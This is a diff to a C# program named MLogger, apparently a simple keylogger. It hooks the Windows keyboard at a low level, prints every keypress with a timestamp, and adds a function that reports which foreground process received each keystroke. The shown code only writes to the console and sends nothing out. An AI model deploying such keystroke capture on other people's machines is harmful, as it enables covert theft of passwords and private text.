@@ -40,21 +40,32 @@ namespace MLogger
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                try
-                {
-                    Console.WriteLine("Process - " + procc.MachineName + " " + procc.Id + " " + procc.ProcessName);
-                }
-                catch(Exception e)
-                {
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("Encountered : " + e.Message);
-                    Console.ForegroundColor = ConsoleColor.White;
-                }
                 Console.WriteLine((Keys)vkCode + " " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt"));
+                Console.WriteLine(GetForegroundProcessName());
             }
 
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
+
+        private static string GetForegroundProcessName()
+        {
+            IntPtr hwnd = GetForegroundWindow();
+
+            if (hwnd == null)
+                return "null";
+
+            uint pid;
+            GetWindowThreadProcessId(hwnd, out pid);
+
+            foreach (System.Diagnostics.Process p in System.Diagnostics.Process.GetProcesses())
+            {
+                if (p.Id == pid)
+                    return p.ProcessName + " "+p.Id;
+            }
+
+            return "null";
+        }
+
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -68,5 +79,11 @@ namespace MLogger
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [System.Runtime.InteropServices.DllImport("user32.dll")]
+        private static extern IntPtr GetForegroundWindow();
+        [System.Runtime.InteropServices.DllImport("user32.dll")]
+        private static extern Int32 GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+
     }
 }
